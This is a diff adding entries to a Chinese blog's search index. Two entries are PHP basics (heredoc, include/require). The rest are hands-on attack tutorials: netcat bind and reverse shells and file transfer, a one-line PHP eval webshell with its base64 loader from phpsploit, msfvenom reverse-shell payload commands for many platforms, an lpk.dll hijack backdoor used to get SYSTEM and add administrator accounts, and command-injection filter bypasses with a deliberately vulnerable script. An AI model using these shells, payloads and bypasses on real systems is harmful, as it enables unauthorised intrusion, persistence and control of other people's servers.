@@ -1,6 +1,205 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>heredoc和nowdoc</title>
+    <url>/2020/01/14/heredoc%E5%92%8Cnowdoc/</url>
+    <content><![CDATA[<pre><code class="php">&lt;?php  
+//heredoc  
+$title = &quot;heredoc的用法&quot;;  
+$str1 = &lt;&lt;&lt;heredoc  
+&lt;h1&gt;$title&lt;/h1&gt;  
+&lt;p&gt;当需要写一大段文字的时候，这段文件包含了单引号，双引号，还有转义符，用其他方式来输出往往  
+比较麻烦。\n这时候可以用heredoc。&lt;/p&gt;  
+&lt;p&gt;heredoc的语法如下：&lt;/p&gt;  
+1.开始和结尾需要插入标识符；&lt;br /&gt;  
+2.标识符和名称和变量名的要求一样；&lt;br /&gt;  
+3.开始标识符前面必须有3个左尖括号：&lt;&lt;&lt;；&lt;br /&gt;  
+4.结束标识符必须在一行开始处，前面不能有空格和其他字符；&lt;br /&gt;  
+5.heredoc相当于加长版的双此号标识，即会解析变量和转义序列。&lt;br/&gt;  
+heredoc;  
+echo $str1;  
+
+//nowdoc  
+$str2 = &lt;&lt;&lt;&#39;nowdoc&#39;  
+&lt;h1&gt;nowdoc的用法&lt;/h1&gt;  
+&lt;p&gt;nowdoc是PHP5.3新增的特殊，语法和heredoc类似，主要的区别如下：&lt;/p&gt;  
+1.开始标识必须用单引号引起来；&lt;br /&gt;  
+2.nowdoc相当于加长版的单引号标识，不会解析变量和转义序列。&lt;br /&gt;  
+例如：&lt;br /&gt;  
+This is a test.\n$title  
+nowdoc;  
+echo $str2;  
+?&gt;  </code></pre>
+<p>输出如下：<br><img src="http://static.zybuluo.com/xmy2017/o5c98j2uboshnlwkixvkc1tz/image_1bftutff2h0l6sovgbcig1prq9.png" alt="image_1bftutff2h0l6sovgbcig1prq9.png-83kB"></p>
+<p>&emsp;&emsp;在源代码中可以看到\n是成功转义了的：<br><img src="http://static.zybuluo.com/xmy2017/81wunchq3zd3fdo1alos6rfz/image_1bftuu41lrecmcm1pom1bk69slm.png" alt="image_1bftuu41lrecmcm1pom1bk69slm.png-79.4kB"></p>
+]]></content>
+      <categories>
+        <category>PHP学习</category>
+      </categories>
+      <tags>
+        <tag>PHP学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>include和require</title>
+    <url>/2020/01/14/include%E5%92%8Crequire/</url>
+    <content><![CDATA[<p>PHP包含文件最常用的两种方式是include()和require()。</p>
+<h4 id="include-和require"><a href="#include-和require" class="headerlink" title="include()和require()"></a>include()和require()</h4><p>include()的语法如下：</p>
+<pre><code>include(/path/to/filename)</code></pre><p>和print、echo一样，include()可以省略括号，使用引号来代替。include包含的代码必须使用PHP界定符包含起来，否则是不能正确解析的。如果启用了PHP配置指令allow_url_fopen，include()还可以包含一个远程文件。</p>
+<p>require()和include()相似，但它们有以下几个区别：<br>1.include()有返回值，require()没有。<br>2.require()是无条件包含，即将require()放入条件判断语句中，无论判断真假require()都会执行。<br>3.require()出错时，脚本将停止执行；而include()出错时，脚本会继续往下执行。</p>
+<h4 id="include-once-和require-once"><a href="#include-once-和require-once" class="headerlink" title="include_once()和require_once()"></a>include_once()和require_once()</h4><p>和include()、require类似，include_once()和require_once()同样用于包含文件，但它们会在包含文件前首先确认该文件是否已经被包含了，如果已经包含了文件，则include_once()和require_once()就不再执行。 </p>
+]]></content>
+      <categories>
+        <category>PHP学习</category>
+      </categories>
+      <tags>
+        <tag>PHP学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>nc使用实战</title>
+    <url>/2020/01/14/nc%E4%BD%BF%E7%94%A8%E5%AE%9E%E6%88%98/</url>
+    <content><![CDATA[<h3 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h3><p>使用nc –h显示如下：</p>
+<pre>
+connect to somewhere:   nc [-options] hostname port[s] [ports] ...
+listen for inbound:     nc -l -p port [options] [hostname] [port]
+options:
+    -d              无命令行界面,使用后台模式
+    -e prog         程序重定向 [危险!!]
+    -g gateway      源路由跳跃点, 不超过8
+    -G num          源路由指示器: 4, 8, 12, ...
+    -h              获取帮助信息
+    -i secs         延时设置,端口扫描时使用
+    -l              监听入站信息
+    -L              监听知道NetCat被结束(可断开重连)
+    -n              以数字形式表示的IP地址
+    -o file         使进制记录      -p port         打开本地端口
+    -r              随机本地和远程的端口
+    -s addr         本地源地址
+    -t              以TELNET的形式应答入站请求
+    -u              UDP 模式
+    -v              显示详细信息 [使用=vv获取更详细的信息]
+    -w secs         连接超时设置
+    -z              I/O 模式 [扫描时使用]
+端口号可以是单个的或者存在一个范围: m-n [包含值]
+</pre>
+
+<h3 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h3><p><font color="red">nc –vv –l –p port</font><br><img src="http://static.zybuluo.com/xmy2017/wo7739gvifyfn3dk333ktz8n/10.png" alt="10.png-5.3kB"></p>
+<h3 id="创建临时后门"><a href="#创建临时后门" class="headerlink" title="创建临时后门"></a>创建临时后门</h3><p>靶机：<font color="red">nc –l –p port –e cmd.exe</font><br>攻击机：<font color="red">nc remote_ip port</font><br><img src="http://static.zybuluo.com/xmy2017/zzhwnf3rfpsx5r0k61ki08ly/11.png" alt="11.png-2.8kB"><br><img src="http://static.zybuluo.com/xmy2017/ikkx6flvahb82031ymu4t0vq/12.png" alt="12.png-30.3kB"></p>
+<h3 id="创建telnet后门"><a href="#创建telnet后门" class="headerlink" title="创建telnet后门"></a>创建telnet后门</h3><p>靶机：<font color="red">nc –l –p port –t –e cmd.exe</font><br>攻击机：<font color="red">telnet remote_ip port</font><br><img src="http://static.zybuluo.com/xmy2017/27ubxy1nzbdaqqu4a8k9k16e/13.png" alt="13.png-2.8kB"><br><img src="http://static.zybuluo.com/xmy2017/6719nc1fi8tszmluo18eidei/14.png" alt="14.png-28kB"></p>
+<h3 id="创建长期后门"><a href="#创建长期后门" class="headerlink" title="创建长期后门"></a>创建长期后门</h3><p>靶机：<font color="red">nc –l –p port –L –d –e cmd.exe</font><br>攻击机：<font color="red">nc remote_ip port</font><br><img src="http://static.zybuluo.com/xmy2017/1x4wykl6k1fz70syo727zrqe/15.png" alt="15.png-2.9kB"><br><img src="http://static.zybuluo.com/xmy2017/7it0xf679redlw1cikrgx2gv/16.png" alt="16.png-31.8kB"></p>
+<h3 id="创建反向后门"><a href="#创建反向后门" class="headerlink" title="创建反向后门"></a>创建反向后门</h3><p>靶机：<font color="red">nc –e cmd.exe remote_ip port</font><br>攻击机：<font color="red">nc –l –p port</font><br><img src="http://static.zybuluo.com/xmy2017/bi9btixmslh066q3gtx37lq4/17.png" alt="17.png-3.4kB"><br><img src="http://static.zybuluo.com/xmy2017/hu6s7qr8e6jm29iep6t1jt6c/18.png" alt="18.png-30.6kB"></p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>靶机：<font color="red">nc –l –u –p port &gt; file_path</font><br>攻击机：<font color="red">nc –u remote_ip port &lt; file_path</font><br><img src="http://static.zybuluo.com/xmy2017/sfh9pdiyn72ppnaqmxy4fmh5/19.png" alt="19.png-2.9kB"><br><img src="http://static.zybuluo.com/xmy2017/2c1sqh17z2ddl5m4vye2rs7r/20.png" alt="20.png-29.1kB"></p>
+]]></content>
+      <categories>
+        <category>后门工具</category>
+      </categories>
+      <tags>
+        <tag>后门工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php后门工具phpsploit</title>
+    <url>/2020/01/14/php%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7phpsploit/</url>
+    <content><![CDATA[<p>最近看到一款php后门工具phpsploit，试用了一下，这里写个简单的体验说明。<br>工具下载地址：<font color="blue"><a href="https://github.com/nil0x42/phpsploit" target="_blank" rel="noopener">github传送门</a></font><br><img src="http://static.zybuluo.com/xmy2017/vti4pfidqoqmbub7z7nd643t/1.png" alt="1.png-270.3kB"></p>
+<p align="center">（图是直接从github上粘贴过来的）</p>
+
+<p>工具特性什么的我就懒得写了，自己看README。<br>上传到目标服务器的是php一句话木马，特点是使用SERVER进行连接和通信：</p>
+<pre><code class="php">&lt;?php @eval($_SERVER[&#39;HTTP_PHPSPL01T&#39;]); ?&gt;</code></pre>
+<p>下载后直接运行phpsploit脚本即可：<br><img src="http://static.zybuluo.com/xmy2017/62eo7yhydp2rz8dd9yzajkw9/2.png" alt="2.png-48.6kB"><br>设置一句话木马路径：<br><img src="http://static.zybuluo.com/xmy2017/uxr3529trpgiy97j1ltrrrl0/3.png" alt="3.png-24.3kB"><br>连接木马：<br><img src="http://static.zybuluo.com/xmy2017/7n19xo9sd5xpumwjndi47oin/4.png" alt="4.png-44kB"><br>获取phpinfo信息：<br><img src="http://static.zybuluo.com/xmy2017/o8tmng4612gr1mey8a1m8fj5/4.png" alt="4.png-118.7kB"><br>使用系统命令：<br><img src="http://static.zybuluo.com/xmy2017/7s0c6pss8fryfyx4k8m4hoso/6.png" alt="6.png-121.7kB"><br>使用wireshark查看通信数据包：<br><img src="http://static.zybuluo.com/xmy2017/3fg8yza4qzppe0zawl5jay2c/7.png" alt="7.png-204.4kB"><br>可以看到数据包都在Header中，经过了加密和编码，其中Phpsplo1T使用的是base64编码，解码后如下：</p>
+<pre><code class="php">$s=$_SERVER;ksort($s);$x=&quot;&quot;;foreach($s as $a=&gt;$b)if(substr($a,0,7)==&#39;HTTP_ZZ&#39;)$x.=$b;eval(base64_decode(&quot;$x&quot;));</code></pre>
+<p>查看access访问日志如下：<br><img src="http://static.zybuluo.com/xmy2017/nn9wf4rtb0n2ht2zji4zzktl/8.png" alt="8.png-140.1kB"></p>
+]]></content>
+      <categories>
+        <category>后门工具</category>
+      </categories>
+      <tags>
+        <tag>后门工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msfvenom后门生成工具</title>
+    <url>/2020/01/14/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<p>渗透神器Metasploit的功能之一就是生成与利用攻击载荷（Payload），生成这些载荷的工具是msfvenom。下面我们来玩一个这个一听就知道十分好玩的工具。</p>
+<h3 id="msfvenom的参数"><a href="#msfvenom的参数" class="headerlink" title="msfvenom的参数"></a>msfvenom的参数</h3><p>我们先来看一下msfvenom的命令行选项：</p>
+<p>Options:<br>    -p, --payload    <payload>    指定需要使用的payload。如果需要自定义，请使用“-”或者stdin指定<br>      --payload-options        列出payload的选项<br>    -l, --list    [module_type]    列出指定模块的所有可用资源，模块类型包括payloads、encoders、nops和all<br>    -n, --nopsled    <length>        为payload预先指定一个NOP滑动长度<br>    -f, --format    <format>        指定输出格式（使用--help-formats来获取msf支持的格式）<br>    -e, --encoder    <encoder>    指定需要使用的encoder（编码器）<br>    -a, --arch        <architecture>    指定payload的目标架构<br>       --plateform    <plateform>    指定payload的目标平台<br>    -s, --space    <length>        设置有效攻击载荷的最大长度<br>    -b, --bad-chars    <list>    设置规避字符集<br>    -i, --iterations    <count>        指定payload的编码次数<br>    -c, --add-code    <path>        指定一个附加的win32 shellcode文件<br>    -x, --template <path>        指定一个自定义的可执行文件作为模板<br>    -k, --keep                    保护模板程序的动作，注入的payload作为一个新进程运行<br>       --payload-options        列举payload的标准选项<br>    -o, --out    <path>            保存payload<br>    -v, --var-name     <name>        指定一个自定义变量，以确定输出格式<br>    --shellest                    最小化生成payload<br>    -h, --help                查看帮助选项<br>    --help-formats                查看msf支持的输出格式列表</p>
+<h3 id="列出所有的模块资源"><a href="#列出所有的模块资源" class="headerlink" title="列出所有的模块资源"></a>列出所有的模块资源</h3><p>使用msfvenom –l来列出所有的模块资源， 可以指定模块payloads、encoders、nops和all。msfvenom支持的Payload极多，需要好好挖掘。如下：<br><img src="http://static.zybuluo.com/xmy2017/fgjgf3za6dg2velm4e316ny2/9.png" alt="9.png-198.5kB"></p>
+<h3 id="常用的系统Payload"><a href="#常用的系统Payload" class="headerlink" title="常用的系统Payload"></a>常用的系统Payload</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre>msfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f elf –o shell.elf</pre>
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre>msfvenom –p windows/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f exe –o shell.exe</pre>
+<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><pre>msfvenom –p osx/x86/shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f macho –o shell.macho</pre>
+<h3 id="常用的脚本Payload"><a href="#常用的脚本Payload" class="headerlink" title="常用的脚本Payload"></a>常用的脚本Payload</h3><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><pre>msfvenom –p php/meterpreter_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.php</pre>
+<h4 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h4><pre>msfvenom –p windows/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f asp –o shell.asp</pre>
+<h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><pre>msfvenom –p java/jsp_shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.jsp</pre>
+<h4 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h4><pre>msfvenom –p java/jsp_shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f war –o shell.war</pre>
+<h3 id="其他常用Payload"><a href="#其他常用Payload" class="headerlink" title="其他常用Payload"></a>其他常用Payload</h3><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><pre>msfvenom –p cmd/unix/reverse_python LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.py</pre>
+<h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><pre>msfvenom –p cmd/unix/reverse_bash LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.sh</pre>
+<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><pre>msfvenom –p cmd/unix/reverse_perl LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.pl</pre>
+<h3 id="监听Payload运行"><a href="#监听Payload运行" class="headerlink" title="监听Payload运行"></a>监听Payload运行</h3><p>将Payload上传到目标主机运行，就可以连接Payload进行操作。监听Payload运行的操作如下：</p>
+<p>&gt;&gt;&gt;use exploit/multi/handler<br>&gt;&gt;&gt;set <i>Your Payload</i><br>&gt;&gt;&gt;set <i>LHOST Your IP</i><br>&gt;&gt;&gt;set <i>LPORT Your Port</i><br>&gt;&gt;&gt;exploit</p>
+<p>注意其中Payload、LHOST和LPORT的设置必须和生成Payload时的设置一样。</p>
+]]></content>
+      <categories>
+        <category>后门工具</category>
+      </categories>
+      <tags>
+        <tag>后门工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>lpk后门的使用</title>
+    <url>/2020/01/14/lpk%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h3 id="什么是lpk"><a href="#什么是lpk" class="headerlink" title="什么是lpk"></a>什么是lpk</h3><p>lpk.dll是一个系统文件，它位于system32目录下，每个可执行文件运行之前都会加它。Windows系统的特性是先判断当前文件目录是否存在lpk.dll文件，如果不存在，再判断sytem32目录。基于这个特性，lpk的劫持就产生了。</p>
+<h3 id="T00ls-Lpk-Sethc"><a href="#T00ls-Lpk-Sethc" class="headerlink" title="T00ls Lpk Sethc"></a>T00ls Lpk Sethc</h3><p>这款工具是用于劫持lpk的后门，可以当作辅助提权之用。下面介绍它的用法。<br>使用流程大体如下：<br>（1）生成lpk.dll文件；<br>（2）上传lpk.dll文件到目标服务器有可执行文件的目录，等待管理员运行可执行文件；<br>（3）使用lpk后门控制目标服务器。</p>
+<h4 id="生成lpk-dll文件"><a href="#生成lpk-dll文件" class="headerlink" title="生成lpk.dll文件"></a>生成lpk.dll文件</h4><p>生成lpk.dll文件前请关闭杀毒软件，否则会生成失败。生成过程如下：<br><img src="http://static.zybuluo.com/xmy2017/o5cu6lrozxgby2u2ynns6prs/6.png" alt="6.png-29.3kB"><br>如果目标主机没有开放3389，可以钩选“执行CMD”，使用命令开启3389端口。也可以通过配置邮件通知来获知管理员是否执行后门。这里的“Sethc启动设置”是指启用后门的组合键，如果不知道键值查看热键代码表，此处为A键和B键。<br>点击“生成”即可生成lpk.dll文件，这里需要注意的是命名一定要是“lpk.dll”，不能更改。生成成功后不要再运行T00ls Lpk Sethc程序，否则自己就中木马了。</p>
+<h4 id="上传lpk-dll到目标服务器"><a href="#上传lpk-dll到目标服务器" class="headerlink" title="上传lpk.dll到目标服务器"></a>上传lpk.dll到目标服务器</h4><p>将lpk.dll上传到目标服务器，需要目录里面有可执行文件。这里我使用大马进行上传：<br><img src="http://static.zybuluo.com/xmy2017/vzi7q83y4w6ahp1pw7o7gs4h/7.png" alt="7.png-8.5kB"><br>上传成功后，需要等待管理员执行目录中的可执行文件，才能运行后门。这里我既然已经上传了大马了，所以我可以上传一个cmd.exe到该目录，然后运行它：<br><img src="http://static.zybuluo.com/xmy2017/ryyldqf5g9491caeaphmryzy/8.png" alt="8.png-5.9kB"><br>这样就顺利地把后门执行起来了。</p>
+<h4 id="使用lpk后门"><a href="#使用lpk后门" class="headerlink" title="使用lpk后门"></a>使用lpk后门</h4><p>远程连接目标服务器，出现如图界面后连接按下5次shift键：<br><img src="http://static.zybuluo.com/xmy2017/aiu2fncsni1bpgyjiktnev4u/9.png" alt="9.png-26.8kB"><br>出现如下界面：<br><img src="http://static.zybuluo.com/xmy2017/jn0h0ael1coqee57ihqe7pob/10.png" alt="10.png-33kB"><br>这时候同时按下设置的组合键（我这里是A键和B键），如果不成功就多按几次，成功会出现密码输入框：<br><img src="http://static.zybuluo.com/xmy2017/y53n83eknykfbh5lngnfgd1v/11.png" alt="11.png-27.6kB"><br>输入设置的密码，接下来就是愉快的玩了：<br><img src="http://static.zybuluo.com/xmy2017/oh72xke36i5c6ujcjfwomqsi/12.png" alt="12.png-22.3kB"><br>可以按“CmdShell”调出cmd窗口，可以看到，已经提权成system了：<br><img src="http://static.zybuluo.com/xmy2017/av2ptm2xwoui4243gsrui8w3/13.png" alt="13.png-34.7kB"><br>可以添加用户并加入管理员组：<br><img src="http://static.zybuluo.com/xmy2017/sbexbf6wb0cebskgduxugw0g/14.png" alt="14.png-19.8kB"><br>可以按“Explorer”调出Windows界面：<br><img src="http://static.zybuluo.com/xmy2017/lig3kiydw2peaa3yeekurpr9/15.png" alt="15.png-32.9kB"><br>功能很多，想怎么玩就怎么玩……</p>
+]]></content>
+      <categories>
+        <category>后门工具</category>
+      </categories>
+      <tags>
+        <tag>后门工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux命令执行小技巧</title>
+    <url>/2020/01/14/Linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>分别在Linux和PHP环境下测试，PHP测试脚本如下：</p>
+<pre><code class="php">&lt;?php
+    $cmd = $_GET[&#39;cmd&#39;];
+    $black = array(&#39; &#39;);
+    str_ireplace($black, &#39;&#39;, $cmd, $i);
+    if($i != 0)
+    {
+        die(&quot;Attack!&quot;);
+    }
+    else
+    {
+        system($cmd);
+    }
+?&gt;</code></pre>
+<h4 id="小于号（-lt-）"><a href="#小于号（-lt-）" class="headerlink" title="小于号（&lt;）"></a>小于号（&lt;）</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/6u6l6n126dc253w47wtjgcs8/1.png" alt="1.png-15.7kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/59lgqax0jepw9k86wdv9gpfb/2.png" alt="2.png-59.7kB"> </p>
+<h4 id="两个尖括号（-lt-gt-）"><a href="#两个尖括号（-lt-gt-）" class="headerlink" title="两个尖括号（&lt;&gt;）"></a>两个尖括号（&lt;&gt;）</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/elbqnmkcxvs9td6pbg3dxbem/3.png" alt="3.png-12.5kB"><br>PHP环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/ar1kv8jb8yumkfjig0x3iuyu/4.png" alt="4.png-62.6kB"> </p>
+<h4 id="Tab键（-09）"><a href="#Tab键（-09）" class="headerlink" title="Tab键（%09）"></a>Tab键（%09）</h4><p>Linux环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/mr6mzy7ali916mydssalrp8f/5.png" alt="5.png-17.6kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/m3qkysgcovn7kafap2206n7l/6.png" alt="6.png-59.5kB"> </p>
+<h4 id="IFS"><a href="#IFS" class="headerlink" title="$IFS$"></a>$IFS$</h4><p>Linux环境下，$IFS$(1-9)（文件名）都可以，0和两位以上的整数就无法识别了：<br><img src="http://static.zybuluo.com/xmy2017/9294d50xer6a6d9c67mqcnrq/7.png" alt="7.png-48.9kB"><br><img src="http://static.zybuluo.com/xmy2017/1lz86v45k3p0v2aup0h3w1pg/8.png" alt="8.png-60.8kB"><br> PHP环境下，$IFS$后面接0以上（不包括0）的整数都可以识别：<br><img src="http://static.zybuluo.com/xmy2017/0whlfbzvnlkgrppa8amxvvso/9.png" alt="9.png-71.1kB"> </p>
+<h4 id="IFS-1"><a href="#IFS-1" class="headerlink" title="${IFS}"></a>${IFS}</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/bvcsje4dopmxo7bjinr4e7pb/10.png" alt="10.png-13.1kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/2jqnadkzr3zz7k6rkkyf5q7g/11.png" alt="11.png-64kB"> </p>
+<h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><h4 id="0a"><a href="#0a" class="headerlink" title="%0a"></a>%0a</h4><p>Linux环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/6hnc68ehmww57bwjj9xigd5i/12.png" alt="12.png-18.1kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/xy4fduy9r9dh1oc632z2l06o/13.png" alt="13.png-16.6kB"></p>
+<h4 id="0d"><a href="#0d" class="headerlink" title="%0d"></a>%0d</h4><p>Linux环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/e63iaukpnk5zgtfx1e3ns15k/14.png" alt="14.png-18.6kB"><br>PHP环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/u4du5552skxn7305z1kx3mjc/15.png" alt="15.png-12.6kB"> </p>
+<h4 id="分号（-）"><a href="#分号（-）" class="headerlink" title="分号（;）"></a>分号（;）</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/erfzholf35yyxa8na9kaieek/16.png" alt="16.png-55.5kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/rgb8kwav0g41k2fu54x800bh/17.png" alt="17.png-15.6kB"> </p>
+<h4 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/6l646edagc2pqlkad26k7z3s/18.png" alt="18.png-106kB"></p>
+<h4 id="管道符（-）"><a href="#管道符（-）" class="headerlink" title="管道符（|）"></a>管道符（|）</h4><p>管道符只会执行后一个指令：<br><img src="http://static.zybuluo.com/xmy2017/xteyvn27qy446q5o611bd03d/19.png" alt="19.png-11.6kB"></p>
+<h3 id="命令终止符"><a href="#命令终止符" class="headerlink" title="命令终止符"></a>命令终止符</h3><h4 id="（-00-20-）"><a href="#（-00-20-）" class="headerlink" title="（%00%20#）"></a>（%00%20#）</h4><p>只会执行前一个指令：<br><img src="http://static.zybuluo.com/xmy2017/0z1vyqhwgohrfsgigf8r9nff/20.png" alt="20.png-15.4kB"></p>
+<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="参数定义"><a href="#参数定义" class="headerlink" title="参数定义"></a>参数定义</h4><p>比如在限制不允许使用cat的情况下遍历目录，Linux环境下可以这样使用：<br><img src="http://static.zybuluo.com/xmy2017/pshm0c4pursmhwecmty8mqpb/21.png" alt="21.png-45kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/b2fp5nzlxcx69wujya6493vf/22.png" alt="22.png-68.5kB"><br>####4.2 base64编码<br><img src="http://static.zybuluo.com/xmy2017/nxbordhxqkvmhif0zpuxy5wo/23.png" alt="23.png-18.8kB"><br>编码的内容为“cat test.txt”。</p>
+<p>参考：<br><a href="http://url.cn/5NsHbNP" target="_blank" rel="noopener">http://url.cn/5NsHbNP</a></p>
+]]></content>
+      <categories>
+        <category>命令执行</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>masscan扫描</title>
     <url>/2020/01/14/masscan%E6%89%AB%E6%8F%8F/</url>
     <content><![CDATA[<p>Masscan号称是最快的互联网端口扫描器，据说可以在六分钟内扫遍互联网。Masscan可以运行在Linux和Mac OS下。</p>
